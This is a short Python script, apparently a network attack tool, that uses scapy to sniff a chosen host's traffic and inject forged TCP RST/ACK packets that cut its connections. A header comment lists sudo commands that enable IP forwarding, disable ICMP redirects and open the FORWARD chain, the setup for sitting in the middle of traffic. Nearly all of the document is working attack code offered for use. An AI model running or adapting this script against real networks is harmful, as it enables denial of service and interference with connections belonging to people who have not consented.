#!/usr/bin/python

'''
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
sudo sh -c 'echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects'
sudo sh -c 'echo 0 > /proc/sys/net/ipv4/conf/eno1/send_redirects'
sudo sh -c 'echo 0 > /proc/sys/net/ipv4/conf/wlp2s0/send_redirects'
sudo iptables -P FORWARD ACCEPT
'''

import sys
from scapy.all import *
from time import sleep

if len(sys.argv) != 2:
  print "Usage:", sys.argv[0], '[ip src]'
  print 'Example:', sys.argv[0], '11.22.33.44'
  exit(1)


def parse_packet(p):
  print "[+] inside function"
  if p.haslayer(TCP) and p[TCP].flags in [ 2, 16, 24 ]: # S,A,PA
    tcp.seq=0
    tcp.ack=p[TCP].seq+1
    send(ip/tcp, verbose=0)
    print '[+] sent RST/ACK from', p[IP].src, 'to', p[IP].dst, 'remote port', p[TCP].dport


if __name__ == '__main__':
  ip=IP(dst=sys.argv[1])
  tcp=TCP(flags='RA')

  print '[+] waiting for [S], [A] or [PA] packets...'
  sniff(filter='host ' + ip.src, prn=parse_packet)

